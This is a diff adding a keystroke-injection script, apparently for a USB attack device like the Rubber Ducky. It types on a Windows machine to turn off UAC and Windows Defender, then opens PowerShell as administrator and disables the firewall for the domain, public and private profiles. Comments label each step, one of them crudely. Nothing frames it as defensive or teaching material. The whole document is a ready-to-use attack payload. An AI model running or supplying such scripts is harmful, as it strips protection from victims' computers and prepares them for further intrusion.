@@ -1,0 +1,73 @@
+
+DELAY 2000
+REM first disable UAC
+CONTROL ESCAPE
+DELAY 900
+STRING uac
+DELAY 800
+ENTER
+DELAY 800
+DOWNARROW
+DELAY 800
+DOWNARROW
+DELAY 800
+DOWNARROW
+DELAY 800
+TAB
+DELAY 800
+ENTER
+DELAY 800
+LEFT
+DELAY 800
+ENTER
+DELAY 800
+REM it's time to disable the fuckin' defender....
+CONTROL ESCAPE
+DELAY 800
+STRING virus pro
+DELAY 800
+ENTER
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+TAB
+DELAY 800
+ENTER
+DELAY 800
+SPACE
+DELAY 800
+ALT F4
+DELAY 800
+REM Open PowerShell as an Administrator via Windows Search
+
+REM Open Windows Search
+GUI
+DELAY 1800
+
+REM Type 'PowerShell'
+STRING PowerShell
+DELAY 800
+DELAY 1000
+
+REM Open context menu (assuming PowerShell is highlighted)
+APP
+DELAY 800
+
+REM Select 'Run as administrator' (usually the first option, adjust as needed)
+DELAY 800
+ENTER
+DELAY 800
+LEFT
+DELAY 800
+ENTER
+DELAY 800
+ENTER
+DELAY 800
+STRING Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
+DELAY 800
+ENTER
+
